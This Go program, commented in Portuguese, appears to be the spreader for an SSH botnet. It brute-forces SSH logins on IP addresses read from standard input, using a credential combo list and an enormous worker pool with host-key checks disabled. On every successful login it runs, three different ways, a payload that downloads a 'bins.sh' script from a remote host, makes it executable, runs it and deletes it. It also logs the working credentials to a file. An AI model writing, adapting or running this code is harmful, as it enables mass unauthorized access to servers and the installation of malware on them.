package main

import (
	"bufio"
	"fmt"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
	"golang.org/x/crypto/ssh"
)

var (
	ipaddrs    = sync.Map{}
	timeout    = 60 * time.Second
	numWorkers = runtime.NumCPU() * 30000
)

type Credentials struct {
	Address  string
	Username string
	Password string
}

func testSSH(creds Credentials, wg *sync.WaitGroup) {
	defer wg.Done()

	if _, loaded := ipaddrs.LoadOrStore(creds.Address, true); loaded {
		return
	}

	sshConfig := &ssh.ClientConfig{
		User: creds.Username,
		Auth: []ssh.AuthMethod{
			ssh.Password(creds.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}

	connection, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", creds.Address), sshConfig)
	if err != nil {
		return
	}
	defer connection.Close()

	// Payload malicioso
	payload := "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 0.0.0.0/bins.sh; curl -O 0.0.0.0/bins.sh; chmod 777 bash; sh bash; rm -rf bash; rm -rf bash.1"

	// Sessão 1: Execução direta
	session1, err := connection.NewSession()
	if err == nil {
		_ = session1.Run(payload)
		session1.Close()
	}

	// Sessão 2: Com pseudo-terminal (RequestPty)
	session2, err := connection.NewSession()
	if err == nil {
		modes := ssh.TerminalModes{
			ssh.ECHO:          0,
			ssh.TTY_OP_ISPEED: 14400,
			ssh.TTY_OP_OSPEED: 14400,
		}
		_ = session2.RequestPty("xterm", 80, 40, modes)
		_ = session2.Run(payload)
		session2.Close()
	}

	// Sessão 3: Usando shell interativa via StdinPipe
	session3, err := connection.NewSession()
	if err == nil {
		stdin, _ := session3.StdinPipe()
		_ = session3.Start("/bin/sh")
		_, _ = stdin.Write([]byte(payload + "\n"))
		stdin.Close()
		_ = session3.Wait()
		session3.Close()
	}

	// Log de sucesso
	fmt.Printf("[VALIDO] %s:%s:%s\n", creds.Address, creds.Username, creds.Password)

	saveFile, err := os.OpenFile("validos.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer saveFile.Close()

	entry := fmt.Sprintf("%s:%s:%s\n", creds.Address, creds.Username, creds.Password)
	_, _ = saveFile.WriteString(entry)
}

func worker(jobs <-chan Credentials, wg *sync.WaitGroup) {
	for creds := range jobs {
		testSSH(creds, wg)
	}
}

func main() {
	fmt.Println("[MILNET INICIADO]")

	comboFile, err := os.Open("combo.txt")
	if err != nil {
		fmt.Printf("Erro ao abrir combo.txt: %v\n", err)
		return
	}
	defer comboFile.Close()

	var combos [][]string
	comboScanner := bufio.NewScanner(comboFile)
	for comboScanner.Scan() {
		combo := strings.Split(comboScanner.Text(), " ")
		if len(combo) == 2 {
			combos = append(combos, combo)
		}
	}

	if err := comboScanner.Err(); err != nil {
		fmt.Printf("Erro ao ler combo.txt: %v\n", err)
		return
	}

	jobs := make(chan Credentials, numWorkers*1000)
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		go worker(jobs, &wg)
	}

	reader := bufio.NewReader(os.Stdin)
	scanner := bufio.NewScanner(reader)
	for scanner.Scan() {
		ip := scanner.Text()
		for _, combo := range combos {
			wg.Add(1)
			jobs <- Credentials{Address: ip, Username: combo[0], Password: combo[1]}
		}
	}

	close(jobs)
	wg.Wait()

	if err := scanner.Err(); err != nil {
		fmt.Printf("Erro ao ler entrada: %v\n", err)
	}
}
